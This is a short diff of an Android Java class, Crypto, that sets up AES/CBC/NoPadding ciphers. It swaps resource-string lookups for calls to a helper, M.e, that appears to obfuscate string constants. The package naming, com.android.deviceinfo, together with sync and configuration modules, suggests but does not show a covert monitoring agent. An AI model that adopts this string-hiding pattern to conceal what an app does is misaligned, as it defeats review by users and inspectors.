@@ -12,7 +12,6 @@ package com.android.deviceinfo.crypto;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
-import java.util.Date;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -21,10 +20,9 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.action.sync.Statistics;
 import com.android.deviceinfo.auto.Cfg;
-import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -68,10 +66,10 @@ public class Crypto {
 		this(key);
 		// 17.1=AES/CBC/NoPadding
 		if (encrypt) {
-			cipherEnc = Cipher.getInstance(Messages.getString("17_1")); //$NON-NLS-1$
+			cipherEnc = Cipher.getInstance(M.e("AES/CBC/NoPadding")); //$NON-NLS-1$
 			cipherEnc.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
 		} else {
-			cipherDec = Cipher.getInstance(Messages.getString("17_1")); //$NON-NLS-1$
+			cipherDec = Cipher.getInstance(M.e("AES/CBC/NoPadding")); //$NON-NLS-1$
 			cipherDec.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
 		}
 	}
